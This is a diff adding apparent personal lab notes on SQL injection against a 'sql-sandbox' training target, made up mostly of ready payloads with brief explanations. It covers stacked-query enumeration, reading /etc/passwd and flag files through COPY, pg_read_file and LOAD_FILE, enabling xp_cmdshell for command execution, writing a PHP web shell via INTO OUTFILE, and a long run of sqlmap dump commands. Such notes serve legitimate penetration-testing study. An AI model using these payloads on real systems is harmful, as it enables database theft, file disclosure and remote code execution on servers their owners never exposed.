@@ -365,3 +365,198 @@ z'))+union+select+(select+group_concat(distinct(column_name)+separator+',+')+fro
 
 ```
 
+###### Stacked Queries
+
+PostgreSQL for demonstration purposes, Microsoft SQL Server also supports stacked queries
+
+```
+10; select * from users;
+
+10; insert into users(id, username, password) values (1001,'hax','hax');
+
+```
+
+Sol:
+
+```
+POST /exploit/api/stacked HTTP/1.1
+Host: sql-sandbox
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://sql-sandbox/exploit/stacked
+Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+Origin: http://sql-sandbox
+Content-Length: 65
+Connection: close
+
+name=mop&sort=name&order=asc%3bselect+datname+from+pg_database%3b
+```
+
+```
+name=mop&sort=name&order=asc%3bselect+version()%3b
+
+name=mop&sort=name&order=asc%3bselect+current_user%3b
+
+name=mop&sort=name&order=asc%3bselect+datname+from+pg_database%3b
+
+name=mop&sort=name&order=asc%3bselect+table_name+from+exercise.information_schema.tables+where+table_schema%3d'public'%3b
+
+name=mop&sort=name&order=asc%3bselect+column_name+from+exercise.information_schema.columns+where+table_name='flags'%3b
+
+name=mop&sort=name&order=asc%3bselect+flag+from+flags%3b
+
+```
+###### Reading and Writing Files
+
+For PostgreSQL
+Specifically, we can use COPY FROM to insert data into a table from a file or COPY TO to copy data to a file from a table.
+
+Using stacked queries.
+
+```
+create table tmp(data text);
+copy tmp from '/etc/passwd';
+select * from tmp;
+```
+We can delete the table we created with "drop table tmp;".
+
+```
+SELECT pg_read_file('/etc/passwd')
+```
+
+In MySQL, we can read files using the LOAD_FILE() function. However, there is a catch. MySQL has a secure_file_priv3 system variable that restricts which directories can be used to read or write files.
+
+We can check the value of this variable with 
+```
+SELECT @@GLOBAL.secure_file_priv;
+```
+Setting the value to an empty string ("") is the same as leaving the value blank.
+Since secure_file_priv is enabled (set to a non-null value) in our sandbox application, we will be restricted to reading and writing files in /var/lib/mysql-files.
+
+```
+SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'
+
+SELECT LOAD_FILE('/var/lib/mysql-files/test.txt') 
+
+```
+
+1
+(Wikipedia, 2021), https://en.wikipedia.org/wiki/Web_shell ↩︎
+
+2
+(The PostgreSQL Global Development Group, 2021), https://www.postgresql.org/docs/13/sql-copy.html ↩︎
+
+3
+(Oracle, 2021), https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv ↩︎
+
+Solution:
+
+```
+SELECT pg_read_file('/tmp/flag.txt') -> postgresql
+
+SELECT LOAD_FILE('/var/lib/mysql-files/flag.txt') - > mysql
+
+```
+
+###### Remote Code Execution
+
+In Microsoft SQL Server, the xp_cmdshell1 function takes a string and passes it to a command shell for execution.
+
+```
+-- To allow advanced options to be changed.  
+EXECUTE sp_configure 'show advanced options', 1;  
+GO  
+-- To update the currently configured value for advanced options.  
+RECONFIGURE;  
+GO  
+-- To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1;  
+GO  
+-- To update the currently configured value for this feature.  
+RECONFIGURE;  
+GO
+```
+Once xp_cmdshell is enabled, we can call it using the following syntax:
+
+```
+EXECUTE xp_cmdshell 'command to run here';
+```
+
+
+1
+(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15 ↩︎
+
+2
+(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15 ↩︎
+
+###### Extra Mile
+
+```
+http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,2
+
+http://sql-sandbox/extramile/index.php?id=1 union all select 1,2
+
+http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(select%20group_concat(distinct(table_schema)%20separator%20%27,%20%27)%20from%20information_schema.tables)
+
+http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(select%20group_concat(distinct(table_name)%20separator%20%27,%20%27)%20from%20information_schema.tables%20where%20table_schema=%27app%27)
+
+http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(select%20group_concat(distinct(column_name)%20separator%20%27,%20%27)%20from%20information_schema.columns%20where%20table_schema=%27app%27%20and%20table_name=%27flags%27)
+
+http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(select%20flag%20from%20flags)
+
+```
+
+Sol:
+
+```
+http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(select%20@@GLOBAL.secure_file_priv)
+
+http://sql-sandbox/extramile/index.php?id=1%20union%20all%20select%201,(SELECT%20LOAD_FILE(%27/root/flag.txt%27))
+
+http://sql-sandbox/extramile/index.php?id=1%20union%20all%20SELECT%203,%22%3C?%20system($_REQUEST[%27cmd%27]);%20?%3E%22%20INTO%20OUTFILE%20%22/var/www/html/d.php%22
+
+http://sql-sandbox/extramile/d.php?cmd=cat%20/root/flag.txt
+```
+
+###### SQLMap
+
+```
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order"
+
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mysql --dump
+
+```
+
+Sqlmap has many other features, such as the ability to attempt Web Application Firewall (WAF) bypasses and execute complex queries to automate the complete takeover of a server. For example, using the os-shell parameter will attempt to automatically upload and execute a remote command shell on the target system. However, this feature only works if the database writes to the application's web root and the application is written in ASP, ASPX, JSP, or PHP.
+
+We can instruct sqlmap to ignore any previous sessions with the --flush-session flag.
+
+Sol
+
+```
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order"
+
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mysql --dump
+
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=postgres&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=postgresql --dump --flush-session --level 3
+
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mssql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbs --flush-session
+
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mssql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mssql -D sqlmap --dump --force-pivoting
+
+
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle --dump --flush-session
+
+
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle  --flush-session
+
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle  --level 3
+
+ 
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle  --dbs --level 3
+
+sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=oracle  --dump -D SQLMAP --level 3
+```
+
